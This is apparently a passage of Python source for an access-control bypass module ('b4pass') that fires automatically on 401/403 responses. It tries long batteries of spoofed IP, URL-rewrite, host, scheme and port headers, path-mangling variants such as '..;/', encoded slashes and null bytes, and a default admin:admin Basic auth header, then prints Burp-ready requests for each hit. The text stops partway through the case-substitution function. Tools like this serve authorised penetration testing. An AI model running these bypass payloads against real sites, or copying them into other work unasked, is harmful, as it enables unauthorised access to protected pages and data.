# -*- coding: utf-8 -*-
# b4pass — 401/403 Bypass Module
# Techniques cross-referenced with gobypass403 v0.8.8, extended 2026
# Auto-triggered on every 401 or 403 result

import sys
import random
import threading
import hashlib
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import urllib.parse

from engine.core.softauth import classify as classify_soft_auth

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ── Colors ────────────────────────────────────────────────────
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
M  = "\033[95m"
C  = "\033[96m"
W  = "\033[1m"
D  = "\033[2m"
X  = "\033[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "curl/7.81.0",
]

# ── Column widths ─────────────────────────────────────────────
W_TAG = 15
W_STA = 7
W_MET = 9
W_SIZ = 11
W_TEC = 45

# Keep terminal bypass output compact and aligned.
# The warning marker uses explicit spacing because emoji glyph width differs
# between Windows terminals, Windows Terminal, and some Linux terminals.
BYPASS_URL_GAP = 3

# ── Global bypass results store ───────────────────────────────
BYPASS_RESULTS = []

# Each thread runs its own bypass battery independently (no cross-thread
# lock around the actual work — that was blocking every other thread from
# scanning while one 403 was being tested, which is what froze the progress
# bar and made it look like the tool stopped checking anything else).
# Output is buffered per-call instead of written line-by-line, then
# flushed as one atomic block through the same lock the rest of the tool's
# terminal output already uses — so concurrent bypasses never interleave
# or garble each other, but they also never block each other's requests.
#
# One run_bypass() call fans its probes out across a ThreadPoolExecutor
# (see _run_bypass_inner below). threading.local() is NOT inherited by
# those worker threads — each pool thread has its own empty _local, so a
# probe running there could never see the buffer the calling thread set
# up. It used to silently fall back to writing straight to stdout from
# whichever worker finished first, and concurrent probes (e.g. several
# header-bypass techniques resolving around the same time) interleaved
# their "REPRODUCE IN BURP SUITE" blocks into one garbled/duplicated-
# looking mess instead of buffering. Fix: every worker thread explicitly
# re-points its own _local.buf at the SAME shared list this call's
# _run_bypass_inner created, right before it runs a probe (see
# _run_in_pool). list.append() is safe to call from multiple threads
# under the GIL, so no extra lock is needed for the buffer itself.
_local = threading.local()


def _p(msg=""):
    buf = getattr(_local, "buf", None)
    if buf is None:
        # No active buffer (shouldn't normally happen) — fall back to a
        # direct write rather than losing the line.
        sys.stdout.write(msg + "\n")
        sys.stdout.flush()
    else:
        buf.append(msg)


def _flush_buffer():
    buf = getattr(_local, "buf", None)
    _local.buf = None
    if not buf:
        return
    block = "\n".join(buf)
    try:
        from engine.view.terminal import output
        output.new_line(block)
    except Exception:
        sys.stdout.write(block + "\n")
        sys.stdout.flush()


def _run_in_pool(shared_buf, shared_delay, task):
    """Entry point for a probe running inside the ThreadPoolExecutor. Runs
    on a pool worker thread, so it must re-establish this call's buffer
    and delay on ITS OWN _local before doing any work — otherwise it
    falls back to unbuffered stdout writes (garbled/interleaved output)
    and ignores -d/--delay (never sleeps) for probes that happen to run
    on a worker thread instead of the calling thread."""
    _local.buf = shared_buf
    _local.delay = shared_delay
    task()


def _row(tag, color, status, method, size, technique, url, redirect=""):
    size_str = f"{size}B" if size is not None else "N/A"
    redir    = f"  -> {redirect}" if redirect else ""
    _p(f"{color}  {tag:<{W_TAG}}{str(status):<{W_STA}}{method:<{W_MET}}"
       f"{size_str:<{W_SIZ}}{technique[:W_TEC]:<{W_TEC}} {url}{redir}{X}")


def _confidence(status, size, method, is_root_relay, is_root_echo=False):
    """Rough confidence that a [BYPASS!] hit is real, not noise — not a
    statistical measure, just penalizes the specific ways this tool's
    own signals are known to be thin:
      - root-relay techniques (X-Original-URL etc.) still trust a header
        to have done the rerouting, so they start lower than a direct
        path hit even when they look fine.
      - a 0-byte or tiny body gives little to actually verify against.
      - 204/206 is weaker evidence than a full 200 body.
      - OPTIONS/HEAD prove a method was allowed, not that real content
        was served.
      - root-echo: the response is byte-identical to the site's plain
        root page. Most of the time this means the header was ignored
        and the request just fell through to "/" — but some apps
        genuinely do serve the same shell at both "/" and the real
        route, so it's not proof either way. Shown, not hidden, but
        capped low so it reads as "verify this one manually".
    Always a direct hit (GET, real 200 body, decent size) = 100%."""
    score = 100
    if is_root_relay:
        score -= 15
    if status in (204, 206):
        score -= 10
    if size == 0:
        score -= 25
    elif size < 50:
        score -= 10
    if method in ("OPTIONS", "HEAD"):
        score -= 10
    if is_root_echo:
        score = min(score, 60)
    return max(50, min(100, score))


def _bypass_display_key(status, method, size, url, redirect=""):
    """Build a stable display key so equivalent bypasses are not printed
    dozens of times. Path variants such as /admin/, /admin/./ and
    /admin// often resolve to the same resource; header relay probes may
    also all return the same root response. Keep the first representative
    result while retaining every technique in the report data."""
    effective = redirect or url
    try:
        parsed = urllib.parse.urlsplit(effective)
        path = parsed.path or "/"
        # Decode only for display deduplication; the actual request is never
        # changed. Repeated slashes and dot segments are normalized because
        # servers commonly resolve them to one canonical resource.
        path = urllib.parse.unquote(path)
        path = re.sub(r"/{2,}", "/", path)
        path = urllib.parse.urljoin("/", path)
        effective = urllib.parse.urlunsplit((parsed.scheme.lower(),
                                             parsed.netloc.lower(), path,
                                             parsed.query, ""))
    except Exception:
        pass
    return (status, method.upper(), size, effective)


def _print_bypass(status, method, size, technique, url, redirect="", burp=None,
                  confidence=100, is_root_echo=False):
    # Keep every confirmed bypass visible. This is intentionally NOT
    # deduplicated: different payloads/techniques can produce the same
    # effective URL and are still useful to a tester.
    #
    # Do not use a fixed-width field around the warning emoji. Some terminals
    # render [33m[1m⚠[0m[32m as a double-width glyph, which makes the closing `]` appear
    # to overlap or drift. Explicit spacing keeps the marker visually clean.
    if is_root_echo:
        tag = "[BYPASS! ⚠ ]"
    else:
        tag = f"[BYPASS! {confidence}%]"

    size_str = f"{size}B" if size is not None else "N/A"
    # One consistent visual column layout:
    #   [TAG]   STATUS  METHOD     SIZE   URL
    redir = f"  -> {redirect}" if redirect else ""
    _p(f"{G+W}  {tag}{' ' * BYPASS_URL_GAP}{str(status):>3}  "
       f"{method:<7} {size_str:>6}{' ' * BYPASS_URL_GAP}{url}{redir}{X}")

    if burp:
        _p(f"{Y}  ↳ REPRODUCE IN BURP SUITE:{X}")
        for line in burp.strip().split("\n"):
            _p(f"{Y}    {line}{X}")
        _p()


def _print_maybe(status, method, size, technique, url, redirect="", burp=None):
    # Unconfirmed signal: status differed from baseline but we couldn't verify
    # it actually escapes the block (e.g. a redirect that bounced right back,
    # or a 401/500 that's still not accessible content). Shown separately so
    # it doesn't get counted as a confirmed bypass.
    _row("[MAYBE?]", Y, status, method, size, technique, url, redirect)


def _print_soft(status, method, size, technique, url, redirect="", tag=""):
    # Looked like a 2xx bypass, but the body matches a client-side auth-wall
    # pattern (SPA shell that JS-redirects to /login, Next.js __N_REDIRECT,
    # etc.) — status/size alone can't tell a real unauthenticated hit from
    # this, so it's surfaced distinctly instead of counted as [BYPASS!].
    _row("[SOFT?]", M, status, method, size, f"{technique} ({tag})", url, redirect)


def _print_skip(status, method, size, technique, url, redirect=""):
    _row("[-]", D, status, method, size, technique, url, redirect)


def _req(session, url, method="GET", headers=None, data=None, timeout=7):
    d = getattr(_local, "delay", 0)
    if d:
        time.sleep(d)
    try:
        h = {"User-Agent": random.choice(USER_AGENTS)}
        if headers:
            h.update(headers)
        r = session.request(method=method, url=url, headers=h,
                            data=data, timeout=timeout,
                            verify=False, allow_redirects=False)
        body_text = ""
        try:
            if "text" in r.headers.get("Content-Type", "") or not r.headers.get("Content-Type"):
                body_text = r.text
        except Exception:
            body_text = ""
        return r.status_code, len(r.content), r.headers.get("Location", ""), body_text
    except Exception:
        return None, None, "", ""


def _resolve_location(base_url, location):
    """Turn a Location header (absolute or relative) into a full URL."""
    if not location:
        return ""
    if location.startswith("http://") or location.startswith("https://"):
        return location
    if location.startswith("/"):
        parsed = urllib.parse.urlsplit(base_url)
        return f"{parsed.scheme}://{parsed.netloc}{location}"
    return base_url.rstrip("/") + "/" + location.lstrip("/")


def _classify(status, size, b_status, b_size):
    """
    Classify a probe result against the baseline (403 or 401).
      'confirmed' - genuinely got past the block (2xx, real content)
      'maybe'     - different, but not proven accessible (401/403/500/503)
      'redirect'  - needs a follow-up request before it can be judged
      None        - same as baseline, or not interesting
    """
    if status is None:
        return None
    if status == b_status and size == b_size:
        return None
    # 204/206 added: a successful bypass can legitimately come back as
    # No Content or Partial Content (Range-aware backends) — both were
    # previously invisible to the tool, which only recognized 200/201.
    if status in (200, 201, 204, 206):
        return "confirmed"
    # 401/403/500/503 other than the baseline's own code are still an
    # interesting signal (e.g. baseline was 403, probe now gets 401 —
    # different enforcement layer reacted, worth a manual look).
    if status in (401, 403, 500, 503) and status != b_status:
        return "maybe"
    if status in (301, 302, 307, 308):
        return "redirect"
    return None


def _content_sig(size, body_text):
    """Fingerprint a response body so it can be compared against the
    site's plain root page. Hash the text when we have it (most
    reliable); fall back to byte length for binary/no-content-type
    responses, which is weaker but still catches the common case."""
    if body_text:
        return "h:" + hashlib.md5(body_text.encode("utf-8", "ignore")).hexdigest()
    return f"len:{size}"



# ══════════════════════════════════════════════════════════════
#  MODULE 1 — HEADER IP SPOOFING (headers_ip)
#  Covers: X-Forwarded-For, X-Real-IP, Client-IP, CF headers,
#  Azure, AppEngine, Nokia, WAP, Ebay, MS, ProxyMesh, etc.
# ══════════════════════════════════════════════════════════════
def _header_ip_bypasses():
    ips = ["127.0.0.1", "0.0.0.0", "10.0.0.1", "192.168.1.1",
           "172.16.0.1", "::1", "localhost"]
    headers_list = []
    for ip in ips:
        headers_list += [
            {"t": f"X-Forwarded-For: {ip}",           "h": {"X-Forwarded-For": ip}},
            {"t": f"X-Forward-For: {ip}",              "h": {"X-Forward-For": ip}},
            {"t": f"X-Forwarded: {ip}",                "h": {"X-Forwarded": ip}},
            {"t": f"X-Forwarding-For: {ip}",           "h": {"X-Forwarding-For": ip}},
            {"t": f"X-Forwarded-For-IP: {ip}",         "h": {"X-Forwarded-For-IP": ip}},
            {"t": f"X-Forwarded-For-Original: {ip}",   "h": {"X-Forwarded-For-Original": ip}},
            {"t": f"X-Originally-Forwarded-For: {ip}", "h": {"X-Originally-Forwarded-For": ip}},
            {"t": f"X-Original-Forwarded-For: {ip}",   "h": {"X-Original-Forwarded-For": ip}},
            {"t": f"X-Real-IP: {ip}",                  "h": {"X-Real-IP": ip}},
            {"t": f"X-Real-Client-IP: {ip}",           "h": {"X-Real-Client-IP": ip}},
            {"t": f"X-Client-IP: {ip}",                "h": {"X-Client-IP": ip}},
            {"t": f"X-Custom-IP-Authorization: {ip}",  "h": {"X-Custom-IP-Authorization": ip}},
            {"t": f"X-Originating-IP: {ip}",           "h": {"X-Originating-IP": ip}},
            {"t": f"X-Remote-IP: {ip}",                "h": {"X-Remote-IP": ip}},
            {"t": f"X-Remote-Addr: {ip}",              "h": {"X-Remote-Addr": ip}},
            {"t": f"X-Remote-Host: {ip}",              "h": {"X-Remote-Host": ip}},
            {"t": f"X-IP: {ip}",                       "h": {"X-IP": ip}},
            {"t": f"X-IP-Addr: {ip}",                  "h": {"X-IP-Addr": ip}},
            {"t": f"X-IP-Address: {ip}",               "h": {"X-IP-Address": ip}},
            {"t": f"X-IP-Trail: {ip}",                 "h": {"X-IP-Trail": ip}},
            {"t": f"X-Origin-IP: {ip}",                "h": {"X-Origin-IP": ip}},
            {"t": f"X-Original-IP: {ip}",              "h": {"X-Original-IP": ip}},
            {"t": f"X-Original-Remote-Addr: {ip}",     "h": {"X-Original-Remote-Addr": ip}},
            {"t": f"X-Proxy-IP: {ip}",                 "h": {"X-Proxy-IP": ip}},
            {"t": f"X-ProxyUser-IP: {ip}",             "h": {"X-ProxyUser-IP": ip}},
            {"t": f"X-ProxyMesh-IP: {ip}",             "h": {"X-ProxyMesh-IP": ip}},
            {"t": f"X-True-Client-IP: {ip}",           "h": {"X-True-Client-IP": ip}},
            {"t": f"X-True-IP: {ip}",                  "h": {"X-True-IP": ip}},
            {"t": f"X-True-Client: {ip}",              "h": {"X-True-Client": ip}},
            {"t": f"X-Fake-IP: {ip}",                  "h": {"X-Fake-IP": ip}},
            {"t": f"X-C-IP: {ip}",                     "h": {"X-C-IP": ip}},
            {"t": f"X-Host-IP: {ip}",                  "h": {"X-Host-IP": ip}},
            {"t": f"X-Server-IP: {ip}",                "h": {"X-Server-IP": ip}},
            {"t": f"X-Cluster-Client-IP: {ip}",        "h": {"X-Cluster-Client-IP": ip}},
            {"t": f"X-Cluster-IP: {ip}",               "h": {"X-Cluster-IP": ip}},
            {"t": f"X-Sp-Forwarded-IP: {ip}",          "h": {"X-Sp-Forwarded-IP": ip}},
            {"t": f"X-From-IP: {ip}",                  "h": {"X-From-IP": ip}},
            {"t": f"X-Ebay-Client-IP: {ip}",           "h": {"X-Ebay-Client-IP": ip}},
            {"t": f"X-Nokia-ipaddress: {ip}",          "h": {"X-Nokia-ipaddress": ip}},
            {"t": f"X-WAP-Network-Client-IP: {ip}",    "h": {"X-WAP-Network-Client-IP": ip}},
            {"t": f"X-FB-User-Remote-Addr: {ip}",      "h": {"X-Fb-User-Remote-Addr": ip}},
            {"t": f"X-Azure-ClientIP: {ip}",           "h": {"X-Azure-ClientIP": ip}},
            {"t": f"X-Azure-SocketIP: {ip}",           "h": {"X-Azure-SocketIP": ip}},
            {"t": f"X-AppEngine-User-IP: {ip}",        "h": {"X-Appengine-User-IP": ip}},
            {"t": f"X-AppEngine-Trusted-IP: {ip}",     "h": {"X-AppEngine-Trusted-IP-Request": ip}},
            {"t": f"X-MS-Forwarded-Client-IP: {ip}",   "h": {"X-MS-Forwarded-Client-IP": ip}},
            {"t": f"X-MS-ADFS-Proxy-Client-IP: {ip}",  "h": {"X-MS-ADFS-Proxy-Client-IP": ip}},
            {"t": f"X-YWBCLO-UIP: {ip}",               "h": {"X-YWBCLO-UIP": ip}},
            {"t": f"Client-IP: {ip}",                  "h": {"Client-IP": ip}},
            {"t": f"True-Client-IP: {ip}",             "h": {"True-Client-IP": ip}},
            {"t": f"True-Client: {ip}",                "h": {"True-Client": ip}},
            {"t": f"Real-IP: {ip}",                    "h": {"Real-IP": ip}},
            {"t": f"Real-Client-IP: {ip}",             "h": {"Real-Client-IP": ip}},
            {"t": f"CF-Connecting-IP: {ip}",           "h": {"CF-Connecting-IP": ip}},
            {"t": f"Fastly-Client-IP: {ip}",           "h": {"Fastly-Client-IP": ip}},
            {"t": f"Proxy-Client-IP: {ip}",            "h": {"Proxy-Client-IP": ip}},
            {"t": f"Proxy-IP: {ip}",                   "h": {"Proxy-IP": ip}},
            {"t": f"Forwarded-For: {ip}",              "h": {"Forwarded-For": ip}},
            {"t": f"Forwarded-For-IP: {ip}",           "h": {"Forwarded-For-IP": ip}},
            {"t": f"Forwarded: for={ip}",              "h": {"Forwarded": f"for={ip}"}},
            {"t": f"Host-IP: {ip}",                    "h": {"Host-IP": ip}},
        ]
    # Deduplicate
    seen = set()
    out = []
    for h in headers_list:
        k = h["t"].split(":")[0]
        if k not in seen:
            seen.add(k)
            out.append(h)
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 2 — HEADER URL OVERRIDE (headers_url)
#  Covers: X-Original-URL, X-Rewrite-URL, X-Override-URL,
#  X-Envoy-Original-Path, X-Accel-Redirect, etc.
# ══════════════════════════════════════════════════════════════
def _header_url_bypasses(target, path):
    host = urllib.parse.urlparse(target).netloc
    return [
        {"t": f"X-Original-URL: {path}",
         "h": {"X-Original-URL": path}, "p": "/",
         "b": f"GET / HTTP/1.1\nHost: {host}\nX-Original-URL: {path}\n⚠ Send to ROOT /"},
        {"t": f"X-Rewrite-URL: {path}",
         "h": {"X-Rewrite-URL": path}, "p": "/",
         "b": f"GET / HTTP/1.1\nHost: {host}\nX-Rewrite-URL: {path}\n⚠ Send to ROOT /"},
        {"t": f"X-Rewrite-URI: {path}",
         "h": {"X-Rewrite-URI": path}, "p": "/",
         "b": f"GET / HTTP/1.1\nX-Rewrite-URI: {path}\n⚠ Send to ROOT /"},
        {"t": f"X-Override-URL: {path}",         "h": {"X-Override-URL": path}},
        {"t": f"X-Override-Path: {path}",        "h": {"X-Override-Path": path}},
        {"t": f"X-Custom-URL: {path}",           "h": {"X-Custom-URL": path}},
        {"t": f"X-Target-URI: {path}",           "h": {"X-Target-URI": path}},
        {"t": f"X-Target-Path: {path}",          "h": {"X-Target-Path": path}},
        {"t": f"X-Path: {path}",                 "h": {"X-Path": path}},
        {"t": f"X-URI: {path}",                  "h": {"X-URI": path}},
        {"t": f"X-URL: {path}",                  "h": {"X-URL": path}},
        {"t": f"X-Request-URL: {path}",          "h": {"X-Request-URL": path}},
        {"t": f"X-Request-URI: {path}",          "h": {"X-Request-URI": path}},
        {"t": f"X-Http-Request-Uri: {path}",     "h": {"X-Http-Request-Uri": path}},
        {"t": f"X-Original-URI: {path}",         "h": {"X-Original-URI": path}},
        {"t": f"X-Original-Path: {path}",        "h": {"X-Original-Path": path}},
        {"t": f"X-Original-Request-URI: {path}", "h": {"X-Original-Request-URI": path}},
        {"t": f"X-Forwarded-Path: {path}",       "h": {"X-Forwarded-Path": path}},
        {"t": f"X-Forwarded-URL: {path}",        "h": {"X-Forwarded-URL": path}},
        {"t": f"X-Forwarded-URI: {path}",        "h": {"X-Forwarded-URI": path}},
        {"t": f"X-Forwarded-Original-URI: {path}","h": {"X-Forwarded-Original-URI": path}},
        {"t": f"X-Forwarded-Context: {path}",    "h": {"X-Forwarded-Context": path}},
        {"t": f"X-Forwarded-Prefix: {path}",     "h": {"X-Forwarded-Prefix": path}},
        {"t": f"X-Forwarded-Request-Uri: {path}","h": {"X-Forwarded-Request-Uri": path}},
        {"t": f"X-Envoy-Original-Path: {path}",  "h": {"X-Envoy-Original-Path": path}},
        {"t": f"X-Accel-Redirect: {path}",       "h": {"X-Accel-Redirect": path}},
        {"t": f"X-Sendfile: {path}",             "h": {"X-Sendfile": path}},
        {"t": f"X-ProxyPath: {path}",            "h": {"X-ProxyPath": path}},
        {"t": f"X-Proxy-URL: {path}",            "h": {"X-Proxy-URL": path}},
        {"t": f"X-HTTP-DestinationURL: {path}",  "h": {"X-HTTP-DestinationURL": path}},
        {"t": f"X-HTTP-Path-Override: {path}",   "h": {"X-HTTP-Path-Override": path}},
        {"t": f"X-Application-Context-Path: {path}","h": {"X-Application-Context-Path": path}},
        {"t": f"X-Ning-Request-URI: {path}",     "h": {"X-Ning-Request-URI": path}},
        {"t": f"X-Route-Request: {path}",        "h": {"X-Route-Request": path}},
        {"t": f"X-Full-Uri: {target}{path}",     "h": {"X-Full-Uri": f"{target}{path}"}},
        {"t": f"X-Cf-URL: {path}",               "h": {"X-Cf-URL": path}},
        {"t": f"X-Flx-Redirect-URL: {path}",     "h": {"X-Flx-Redirect-URL": path}},
        {"t": f"X-Waws-Unencoded-URL: {path}",   "h": {"X-Waws-Unencoded-URL": path}},
        {"t": f"X-MS-Endpoint-Absolute-Path: {path}","h": {"X-MS-Endpoint-Absolute-Path": path}},
        {"t": f"Base-URL: {path}",               "h": {"Base-URL": path}},
        {"t": f"Destination: {path}",            "h": {"Destination": path}},
        {"t": f"Http-URL: {path}",               "h": {"Http-URL": path}},
        {"t": f"Request-URI: {path}",            "h": {"Request-URI": path}},
        {"t": f"Request-Uri: {path}",            "h": {"Request-Uri": path}},
        {"t": f"Proxy-Request-FullURI: {target}{path}","h": {"Proxy-Request-FullURI": f"{target}{path}"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 3 — HEADER HOST OVERRIDE (headers_host)
# ══════════════════════════════════════════════════════════════
def _header_host_bypasses(target):
    host = urllib.parse.urlparse(target).netloc
    return [
        {"t": "X-Forwarded-Host: localhost",       "h": {"X-Forwarded-Host": "localhost"}},
        {"t": f"X-Forwarded-Host: {host}",         "h": {"X-Forwarded-Host": host}},
        {"t": "X-Forwarded-Server: localhost",     "h": {"X-Forwarded-Server": "localhost"}},
        {"t": "X-Host: localhost",                 "h": {"X-Host": "localhost"}},
        {"t": "X-HTTP-Host-Override: localhost",   "h": {"X-HTTP-Host-Override": "localhost"}},
        {"t": "X-Http-Host-Override: localhost",   "h": {"X-Http-Host-Override": "localhost"}},
        {"t": "X-Host-Override: localhost",        "h": {"X-Host-Override": "localhost"}},
        {"t": "X-Original-Host: localhost",        "h": {"X-Original-Host": "localhost"}},
        {"t": "X-Originating-Host: localhost",     "h": {"X-Originating-Host": "localhost"}},
        {"t": "X-Origin-Host: localhost",          "h": {"X-Origin-Host": "localhost"}},
        {"t": "X-Origin: localhost",               "h": {"X-Origin": "localhost"}},
        {"t": "X-Backend-Host: localhost",         "h": {"X-Backend-Host": "localhost"}},
        {"t": "X-Backend-Server: localhost",       "h": {"X-Backend-Server": "localhost"}},
        {"t": "X-Gateway-Host: localhost",         "h": {"X-Gateway-Host": "localhost"}},
        {"t": "X-Dev-Host: localhost",             "h": {"X-Dev-Host": "localhost"}},
        {"t": "X-FB-Host: localhost",              "h": {"X-Fb-Host": "localhost"}},
        {"t": "X-Forwarder-Host: localhost",       "h": {"X-Forwarder-Host": "localhost"}},
        {"t": "X-Forwarding-Host: localhost",      "h": {"X-Forwarding-Host": "localhost"}},
        {"t": "X-Forwared-Host: localhost",        "h": {"X-Forwared-Host": "localhost"}},
        {"t": "Forwarded-Host: localhost",         "h": {"Forwarded-Host": "localhost"}},
        {"t": "X-Server: localhost",               "h": {"X-Server": "localhost"}},
        {"t": "X-Server-Name: localhost",          "h": {"X-Server-Name": "localhost"}},
        {"t": "Forwarded: host=localhost",         "h": {"Forwarded": "host=localhost"}},
        {"t": "X-BlueCoat-Via: localhost",         "h": {"X-BlueCoat-Via": "localhost"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 4 — HEADER SCHEME (headers_scheme)
# ══════════════════════════════════════════════════════════════
def _header_scheme_bypasses(target):
    return [
        {"t": "X-Forwarded-Proto: https",       "h": {"X-Forwarded-Proto": "https"}},
        {"t": "X-Forwarded-Proto: http",        "h": {"X-Forwarded-Proto": "http"}},
        {"t": "X-Forwarded-Scheme: https",      "h": {"X-Forwarded-Scheme": "https"}},
        {"t": "X-Forwarded-Scheme: http",       "h": {"X-Forwarded-Scheme": "http"}},
        {"t": "X-Forwarded-HTTPS: on",          "h": {"X-Forwarded-HTTPS": "on"}},
        {"t": "X-Forwarded-SSL: on",            "h": {"X-Forwarded-SSL": "on"}},
        {"t": "X-Forwarded-SSL: off",           "h": {"X-Forwarded-SSL": "off"}},
        {"t": "X-Protocol-Scheme: https",       "h": {"X-Protocol-Scheme": "https"}},
        {"t": "X-Sp-Edge-Scheme: https",        "h": {"X-Sp-Edge-Scheme": "https"}},
        {"t": "X-Url-Scheme: https",            "h": {"X-Url-Scheme": "https"}},
        {"t": "Front-End-Https: on",            "h": {"Front-End-Https": "on"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 5 — HEADER PORT (headers_port)
# ══════════════════════════════════════════════════════════════
def _header_port_bypasses():
    ports = ["80", "443", "8080", "8443", "8888", "4443", "3000"]
    return [
        {"t": f"X-Forwarded-Port: {p}", "h": {"X-Forwarded-Port": p}}
        for p in ports
    ] + [
        {"t": "X-Port: 80",             "h": {"X-Port": "80"}},
        {"t": "X-Cdn-Src-Port: 443",    "h": {"X-Cdn-Src-Port": "443"}},
        {"t": "X-Protocol-Port: 443",   "h": {"X-Protocol-Port": "443"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 6 — OTHER HEADER TRICKS
# ══════════════════════════════════════════════════════════════
def _header_misc_bypasses(target, path):
    return [
        {"t": f"Referer: {target}/",             "h": {"Referer": f"{target}/"}},
        {"t": f"Referer: {target}{path}",        "h": {"Referer": f"{target}{path}"}},
        {"t": "Referer: https://google.com",     "h": {"Referer": "https://google.com"}},
        {"t": "Accept: application/json",        "h": {"Accept": "application/json"}},
        {"t": "Content-Type: application/json",  "h": {"Content-Type": "application/json"}},
        {"t": "X-HTTP-Method-Override: GET",     "h": {"X-HTTP-Method-Override": "GET"}},
        {"t": "X-Method-Override: GET",          "h": {"X-Method-Override": "GET"}},
        {"t": "X-Debug: true",                   "h": {"X-Debug": "true"}},
        {"t": "X-Internal: true",                "h": {"X-Internal": "true"}},
        {"t": "X-Arbitrary: localhost",          "h": {"X-Arbitrary": "localhost"}},
        {"t": "X-Wap-Profile: localhost",        "h": {"X-Wap-Profile": "localhost"}},
        {"t": "X-Cache-Info: bypass",            "h": {"X-Cache-Info": "bypass"}},
        {"t": "X-From: localhost",               "h": {"X-From": "localhost"}},
        {"t": "From: localhost",                 "h": {"From": "localhost"}},
        {"t": "Authorization: Basic YWRtaW46YWRtaW4=",
         "h": {"Authorization": "Basic YWRtaW46YWRtaW4="}},
        # Combo
        {"t": "COMBO: All IP headers",
         "h": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
               "X-Custom-IP-Authorization": "127.0.0.1", "True-Client-IP": "127.0.0.1",
               "CF-Connecting-IP": "127.0.0.1", "Client-IP": "127.0.0.1"}},
        {"t": "COMBO: IP+Host+Rewrite",
         "h": {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost",
               "X-Original-URL": path, "Client-IP": "127.0.0.1"}, "p": "/",
         "b": f"GET / HTTP/1.1\nX-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost\nX-Original-URL: {path}\n⚠ Send to ROOT /"},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 7 — PATH PREFIX (path_prefix)
# ══════════════════════════════════════════════════════════════
def _path_prefix_variants(path):
    p    = path.rstrip("/")
    name = p.lstrip("/")
    seen = set()
    out  = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    # Prefix tricks (gobypass403: path_prefix module)
    add(f"/{name}",                        "Double leading slash")
    add(f"//{name}",                       "Triple leading slash")
    add(f"/./{name}",                      "Dot-slash prefix")
    add(f"/;/{name}",                      "Semicolon prefix")
    add(f"/..;/{name}",                    "Dotdot-semicolon prefix")
    add(f"/%2f/{name}",                    "Encoded slash prefix")
    add(f"/%2F/{name}",                    "Encoded slash prefix (upper)")
    add(f"/%252f/{name}",                  "Double-encoded slash prefix")
    add(f"/anything;/{name}",             "Anything-semicolon prefix")
    add(f"/..%2f{name}",                   "Dotdot encoded prefix")
    add(f"/%2e/{name}",                    "Encoded dot prefix")
    add(f"/%2e%2e/{name}",                 "Encoded dotdot prefix")
    add(f"/./..%2f{name}",                "Dotslash-dotdot encoded")
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 8 — MID PATH (mid_paths)
# ══════════════════════════════════════════════════════════════
def _mid_path_variants(path):
    p    = path.rstrip("/")
    name = p.lstrip("/")
    # Split path into parts for mid-injection
    parts = name.split("/")
    seen  = set()
    out   = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    # Mid-path injections (gobypass403: mid_paths module)
    if len(parts) >= 1:
        first = parts[0]
        rest  = "/".join(parts[1:])
        sep   = "/" if rest else ""

        add(f"/{first}/;/{rest}" if rest else f"/{first}/;",   "Mid semicolon")
        add(f"/{first}/..;/{rest}" if rest else f"/{first}/..;","Mid dotdot-semicolon")
        add(f"/{first}/./{rest}" if rest else f"/{first}/.",    "Mid dot")
        add(f"/{first}/..%2f{rest}" if rest else f"/{first}/..%2f","Mid dotdot encoded")
        add(f"/{first}/%2f{rest}" if rest else f"/{first}/%2f", "Mid encoded slash")
        add(f"/{first}%20/{rest}" if rest else f"/{first}%20",  "Mid space encoded")
        add(f"/{first}%09/{rest}" if rest else f"/{first}%09",  "Mid tab encoded")

    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 9 — END PATH (end_paths)
# ══════════════════════════════════════════════════════════════
def _end_path_variants(path):
    p    = path.rstrip("/")
    seen = set()
    out  = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    # End-path variations (gobypass403: end_paths module)
    add(f"{p}/",             "Trailing slash")
    add(f"{p}//",            "Double trailing slash")
    add(f"{p}///",           "Triple trailing slash")
    add(f"{p}/.",            "Trailing dot")
    add(f"{p}/./",           "Trailing dot-slash")
    add(f"{p}/..",           "Trailing dotdot")
    add(f"{p}/../",          "Trailing dotdot-slash")
    add(f"{p}..;/",          "Trailing dotdot-semicolon")
    add(f"{p};/",            "Trailing semicolon-slash")
    add(f"{p};",             "Trailing semicolon")
    add(f"{p};param=value",  "Trailing param")
    add(f"{p};jsessionid=x", "Trailing JSESSIONID")
    add(f"{p};a=b",          "Trailing key-value")
    add(f"{p}%20",           "Trailing space")
    add(f"{p}%09",           "Trailing tab")
    add(f"{p}%00",           "Trailing null byte")
    add(f"{p}%23",           "Trailing hash encoded")
    add(f"{p}?",             "Trailing question mark")
    add(f"{p}?bypass=1",     "Trailing bypass param")
    add(f"{p}?debug=true",   "Trailing debug param")
    add(f"{p}#",             "Trailing hash")
    add(f"{p}.json",         "Extension .json")
    add(f"{p}.html",         "Extension .html")
    add(f"{p}.php",          "Extension .php")
    add(f"{p}.asp",          "Extension .asp")
    add(f"{p}.aspx",         "Extension .aspx")
    add(f"{p}.do",           "Extension .do")
    add(f"{p}~1",            "Tilde IIS shortname")
    add(f"{p}~1/",           "Tilde IIS shortname slash")
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 10 — CASE SUBSTITUTION (case_substitution)
# ══════════════════════════════════════════════════════════════
def _case_variants(path):
    p    = path.rstrip("/")
